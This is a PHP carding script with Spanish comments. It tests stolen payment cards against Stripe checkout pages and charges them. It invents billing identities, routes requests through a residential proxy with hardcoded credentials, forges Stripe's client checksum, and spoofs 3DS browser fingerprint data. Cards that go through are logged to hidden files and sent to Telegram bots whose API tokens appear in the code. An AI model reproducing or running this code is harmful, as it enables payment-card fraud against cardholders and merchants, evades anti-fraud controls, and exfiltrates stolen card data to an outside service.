<?php
// Desactiva la notificación de todos los errores de PHP
error_reporting(0);

// Obtiene el valor de pklive, cslive, ip, email y port desde la URL
$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$ip = $_GET['ip'];
$email = $_GET['email'];
$port = $_GET['port'];

// Configura la zona horaria predeterminada
date_default_timezone_set('Asia/Manila');

// Inicializa la variable de conteo
$count = 0;

// Función para dividir una cadena en función de varios separadores
function multiexplode($seperator, $string) {
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};

// Obtiene la información de la tarjeta desde la URL y la divide en partes
$card = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $card)[0];
$mm = multiexplode(array(":", "|", ""), $card)[1];
$yy = multiexplode(array(":", "|", ""), $card)[2];
$cvv = multiexplode(array(":", "|", ""), $card)[3];

// Formatea el mes y el año
if (strlen($mm) == 1) $mm = "0$mm";
if (strlen($yy) == 2) $yy = "20$yy";

// Función para enviar un mensaje a un chat de Telegram cuando se realiza un cargo
function forwardCharged($text) {
    $encodedText = urlencode($text);
    file_get_contents("htxtps://api.telegram.org/bot6006674467:AAGDGydc-FYGE548xyKFUGGOb-LfUIuNqwA/sendMessage?chat_id=5314609497&text=$encodedText");
}

// Función para enviar un mensaje a un chat de Telegram cuando hay fondos insuficientes
function forwardInsuff($text) {
    $encodedText = urlencode($text);
    file_get_contents("htxtps://api.telegram.org/bot5918559679:AAEBIHaQ-zenP4icy6l4vBu26wA_j_VmdHI/sendMessage?chat_id=5314609497&text=$encodedText");
}

// Función para codificar una cadena de texto utilizando XOR
function xor_encode($plaintext) {
    $key = array(5);
    $key_length = count($key);
    $plaintext_length = strlen($plaintext);
    $ciphertext = '';

    for ($i = 0; $i < $plaintext_length; $i++) {
        $ciphertext .= chr(ord($plaintext[$i]) ^ $key[$i % $key_length]);
    }

    return $ciphertext;
}


// Función para codificar una cadena de texto en base64 y reemplazar ciertos caracteres
function encode_base64($text) {
    $encoded_bytes = base64_encode($text);
    $encoded_text = str_replace(array("/", "+"), array("%2F", "%2B"), $encoded_bytes);
    return $encoded_text;
}

// Función para obtener una cadena codificada en JavaScript utilizando la función xor_encode
function get_js_encoded_string($pm) {
    $pm_encoded = xor_encode($pm);
    $base64_encoded = encode_base64($pm_encoded);
    return $base64_encoded . "eCUl";
}

// Función para extraer una subcadena entre dos delimitadores en una cadena de entrada
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

// Obtiene información aleatoria de un usuario desde la API randomuser.me
$curl = curl_init();
$url = "https://randomuser.me/api/0.8/?results=1";
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
if ($response === false) {
    die("Error: " . curl_error($curl));
}

curl_close($curl);
$data = json_decode($response, true);
$fname = ucfirst($data['results'][0]['user']['name']['first']);
$lname = ucfirst($data['results'][0]['user']['name']['last']);
$street = ucfirst($data['results'][0]['user']['location']['street']);
$randomNumber = sprintf("%04d", mt_rand(0, 9999));
$remail = strtolower($fname . '.' . $lname . $randomNumber . '@gmail.com');

// Obtiene la dirección IP utilizando un proxy
retry:
$ip = "residential.pingproxies.com:7777";
$pass = "customer-847ac783WaqQ84:Pp1erei96q";
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/ip');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt_array($ch, array(CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$ips = curl_exec($ch);
curl_close($ch);
if (empty($ips)) {
    echo '<span class="badge bg-danger"><b>DECLINED '.$card.' </span><b>➔ <span class="badge bg-danger"> PROXY DEAD</b></span><br>';
    exit();
}

######################## ACCEPT PAGE #####################
// Enviar una solicitud POST a la API de Stripe para aceptar los términos de servicio
// de una página de pago y obtener información adicional sobre la transacción
$url = 'https://api.stripe.com/v1/payment_pages/'.$cslive.'';
$data = 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'';
$headers = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://pay.openai.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0'
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response123 = curl_exec($ch);
curl_close($ch);
$decodedResponse = json_decode($response123, true);

// Si la respuesta está vacía o no es válida, mostrar el mensaje de error
if ($decodedResponse === null) {
    echo "INIT RESPONSE: $response";
} else {
    // Si hay un error, mostrar el código y el mensaje de error
    if (isset($decodedResponse['error'])) {
        $errorCode = $decodedResponse['error']['code'];
        $errorMessage = $decodedResponse['error']['message'];
        echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>  DECLINED ' . $card . ' ➔ ' . $errorCode . ' MESSAGE : ' . $errorMessage . ' [Retries: ' . $count . '] </b> <br>';
        return;
    } else {
        $init = $decodedResponse['init_checksum'];
        $coname = $json['account_settings']['display_name'];
    }
}

// Obtener el monto de la transacción de diferentes campos en la respuesta
if (isset($decodedResponse['line_item_group']['line_items'][0]['total'])) {
    $amount = $decodedResponse['line_item_group']['line_items'][0]['total'];
} elseif (isset($decodedResponse['invoice']['total'])) {
    $amount = $decodedResponse['invoice']['total'];
} elseif (isset($decodedResponse['line_item_group']['total'])) {
    $amount = $decodedResponse['line_item_group']['total'];
} elseif (isset($decodedResponse['account_settings']['display_name'])) {
    $coname = $decodedResponse['account_settings']['display_name'];
}

// ######################## ACCEPT PAGE END #####################

// La segunda solicitud cURL crea un método de pago con la API de Stripe utilizando
// información de la tarjeta de crédito y detalles de facturación
$url2 = 'https://api.stripe.com/v1/payment_methods';
$data2 = array(
    'type' => 'card',
    'card[number]' => $cc,
    'card[exp_month]' => $mm,
    'card[exp_year]' => $yy,
    'billing_details[name]' => $fname . ' ' . $lname,
    'billing_details[email]' => $email,
    'billing_details[address][country]' => 'PH',
    'billing_details[address][line1]' => '45 Salmon Street',
    'billing_details[address][line2]' => 'Longos',
    'billing_details[address][city]' => 'Malabon',
    'billing_details[address][postal_code]' => '1472',
    'billing_details[address][state]' => 'NCR',
    'key' => $pklive,
    'payment_user_agent' => 'stripe.js/279a4965ee;+stripe-js-v3/279a4965ee;+checkout');
$headers2 = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://pay.openai.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0'
);

// La tercera solicitud cURL confirma la página de pago utilizando el ID de la página de pago
// y la información de la tarjeta de crédito y detalles de facturación
$url3 = "https://api.stripe.com/v1/payment_pages/$cslive/confirm";
$headers3 = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://pay.openai.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0'
);

// ######################## PAYMENT METHOD PAGE #####################

// Inicializa el recurso cURL
$ch = curl_init();

// Establece las opciones de cURL para la segunda solicitud
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data2));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers2);

// Ejecuta la segunda solicitud cURL y guarda la respuesta en $response2
$response2 = curl_exec($ch);

// Cierra el recurso cURL
curl_close($ch);

// Decodifica la respuesta JSON en un arreglo asociativo
$json = json_decode($response2, true);

// Verifica si la respuesta contiene un ID de método de pago
if ($json !== null && isset($json['id'])) {
    // Si el ID de método de pago está presente, crea un token y
    // calcula el js_checksum usando la función get_js_encoded_string()
    $token = $json['id'];
    $pm = '{"id":"' . $token . 'NK5y"';
    $js_checksum = get_js_encoded_string($pm);
} else {
    // Si no hay ID de método de pago, verifica si hay un mensaje de error
    $message = isset($json['error']['message']) ? $json['error']['message'] : '';

    // Si hay un mensaje de error, muestra la información de la tarjeta declinada
    if ($message) {
        echo '<b style="color:#FFFFFF;">IP: '.$ips.' DECLINED ' . $card . ' ➔ ' . $message . ' [Retries: ' . $count . '] </b> <br>';
        return;
    } elseif (strpos($result, 'You passed')) {
        // Si la respuesta contiene 'You passed', incrementa el contador de intentos y vuelve a intentarlo
        $count++;
        goto retry;
    }
}

######################## END PAYMENT METHOD PAGE #####################
######################## CONFIRM PAGE #####################

// Define los datos que se enviarán en la tercera solicitud cURL
$data3 = array(
    'eid' => 'NA',
    'payment_method' => $token,
    'expected_amount' => $amount,
    'expected_payment_method_type' => 'card',
    'key' => $pklive,
    'version' => '279a4965ee',
    'init_checksum' => $init,
    'js_checksum' => $js_checksum
);

// Inicializa el recurso cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url3);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data3));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers3);

// Ejecuta la tercera solicitud cURL y guarda la respuesta en $response3
$response3 = curl_exec($ch);

// Cierra el recurso cURL
curl_close($ch);

// Decodifica la respuesta JSON en un arreglo asociativo
$json = json_decode($response3, true);

// Extrae la información relevante de la respuesta JSON
$payatt = $json['payment_intent']['next_action']['use_stripe_sdk']['three_d_secure_2_source'];
$servertrans = $json['payment_intent']['next_action']['use_stripe_sdk']['server_transaction_id'];
$result = '{"threeDSServerTransID":"'.$servertrans.'"}';
$enc_server = base64_encode($result);
$secret = $json['payment_intent']['client_secret'] ?? null;
$pi = $json['payment_intent']['id'] ?? null;
$message = $json['error']['message'] ?? null;
$dcode = $json['error']['decline_code'] ?? null;
$code = $json['error']['code'] ?? null;
$status = $json['status'] ?? null;
$surl = $json['success_url'] ?? null;

// Verifica si la solicitud fue exitosa
if ($status == 'succeeded') {
    // Si es exitosa, guarda la información de la tarjeta en un archivo y muestra un mensaje de éxito
    $cardInfo = "Checkout INFO : $coname \nCard: $card \nSURL: $surl \nProxy IP: $ip \nProxy Pass: $port";
    fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----CHARGEDDDDDDDDDDD.txt", "a"), $cardInfo . " \r\n\n");
    echo '<div style="color:#FFFFFF;">IP: '.$ips.' <b>#CHARGED '.$card.' ➔ Checkout Successful! - CLICK HERE TO VIEW THE <a href="'.$surl.'">RECEIPT</a></b></div><br>';
    forwardCharged($cardInfo);
    return;
}
// Verifica si la respuesta contiene 'insufficient_funds'
elseif (strpos($response, 'insufficient_funds')) {
    // Si es así, guarda la información de la tarjeta en un archivo y muestra un mensaje de fondos insuficientes
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b><b style="color:#FFFFFF;"> #LIVE '.$card.' ➔ '.$message.' [Retries: '.$count.']</b><br>';
    $cardInfo = "Checkout INFO : $coname \nCard: $card \STATUS: $message \nProxy IP: $ip \nProxy Pass: $port";
    fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----INSUFFFFFFFFF.txt", "a"), $cardInfo . " \r\n\n");
    forwardInsuff($cardInfo);
    return;
}
// Verifica si la respuesta contiene 'verification_url'
elseif (strpos($response, '"verification_url": "')) {
    // Si es así, muestra un mensaje de tarjeta declinada y HCAPTCHA activado
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.' <b>➔  HCAPTCHA TRIGGERED [Retries: '.$count.']</b><br>';
    return;
}
// Verifica si hay un mensaje de error
elseif ($message == true) {
    // Si es así, muestra un mensaje de tarjeta declinada con el código y mensaje de error
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.' ➔ [CODE: '.($dcode ? $dcode : $code).'] ➔ [MESSAGE: '.$message.'] [Retries: '.$count.']<br>';
    exit();
}
// Verifica si la respuesta contiene 'verification_url' nuevamente
elseif (strpos($response, '"verification_url": "')) {
    // Si es así, muestra un mensaje de tarjeta declinada y HCAPTCHA activado
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.' ➔ HCAPTCHA TRIGGERED [Retries: '.$count.']</b><br>';
    return;
}
// Verifica si la respuesta está vacía
elseif (empty($response)) {
    // Si es así, incrementa el contador de intentos y vuelve a intentarlo
    $count++; goto retry;
}

// Define los encabezados HTTP que se enviarán en la solicitud cURL
$headers = array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://js.stripe.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
);

// Define los datos que se enviarán en la solicitud cURL
$data = array(
    'source' => $payatt,
    'browser' => '{"fingerprintAttempted":true,"fingerprintData":"' . $enc_server . '","challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-480","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}',
    'one_click_authn_device_support[hosted]' => 'false',
    'one_click_authn_device_support[same_origin_frame]' => 'false',
    'one_click_authn_device_support[spc_eligible]' => 'true',
    'one_click_authn_device_support[webauthn_eligible]' => 'true',
    'one_click_authn_device_support[publickey_credentials_get_allowed]' => 'true',
    'key' => $pklive
);

// Inicializa el recurso cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Ejecuta la solicitud cURL y guarda la respuesta en $response
$response = curl_exec($ch);

// Cierra el recurso cURL
curl_close($ch);

// Decodifica la respuesta JSON en un arreglo asociativo
$json = json_decode($response, true);

// Verifica si el estado de autenticación 3DS es 'challenge_required'
if ($json && isset($json['state'])) {
    $state = $json['state'];
    if ($state === 'challenge_required') {
        echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.' ➔ 3DS BIN: '.$state.' [Retries: '.$count.']</b><br>';
        return;
    }
}

// Inicializa un nuevo recurso cURL para obtener información sobre el intento de pago
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $ip);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $port);
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$pi?key=$pklive&is_stripe_sdk=false&client_secret=$secret");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
]);

// Ejecuta la solicitud cURL y guarda la respuesta en $result
$result = curl_exec($ch);

// Cierra el recurso cURL
curl_close($ch);

// Decodifica la respuesta JSON en un arreglo asociativo
$extract = json_decode($result, true);

// Extrae la información relevante de la respuesta JSON
$status = $extract['status'];
$errormes = $extract['error']['message'];
$message = $extract['last_payment_error']['message'];
$dcode = $extract['last_payment_error']['decline_code'];
$code = $extract['last_payment_error']['code'];

// Verifica si la solicitud fue exitosa
if ($status == 'succeeded') {
    $cardInfo = "Checkout INFO : $coname \nCard: $card \nSURL: $surl \nProxy IP: $ip \nProxy Pass: $port";
    fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----CHARGEDDDDDDDDDDD.txt", "a"), $cardInfo . " \r\n\n");
    echo '<div style="color:#FFFFFF;">IP: '.$ips.' <b>#CHARGED '.$card.' ➔ Checkout Successful! - CLICK HERE TO VIEW THE <a href="'.$surl.'">RECEIPT</a></b></div><br>';
    forwardCharged($cardInfo);
    return;
}
// Verifica si la respuesta contiene 'insufficient_funds'
elseif (strpos($response, 'insufficient_funds')) {
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b><b style="color:#FFFFFF;"> #LIVE '.$card.' ➔ '.$message.' [Retries: '.$count.']</b><br>';
    $cardInfo = "Checkout INFO : $coname \nCard: $card \STATUS: $message \nProxy IP: $ip \nProxy Pass: $port";
    fwrite(fopen("1t0u12adjkjasd8912h4hksadnasdjfjfj----INSUFFFFFFFFF.txt", "a"), $cardInfo . " \r\n\n");
    forwardInsuff($cardInfo);
    return;
}
// Verifica si la respuesta contiene 'verify_challenge'
elseif (strpos($result, 'verify_challenge')) {
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.' ➔ HCAPTCHA TRIGGERED [Retries: '.$count.']</b><br>';
}
// Verifica si la respuesta contiene 'authentication_challenge'
elseif (strpos($result, 'authentication_challenge')) {
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.' ➔ Aunthentication Challenge [Retries: '.$count.']</b><br>';
}
else {
    echo '<b style="color:#FFFFFF;">IP: '.$ips.' <b>DECLINED '.$card.'  ➔ [CODE: '.($dcode ? $dcode : $code).'] ➔ [MESSAGE: '.$message.'] [Retries: '.$count.']</b><br>';
}

// Termina la ejecución de la página y libera el recurso cURL
######################## END CONFIRM PAGE #####################
unset($ch);

?>
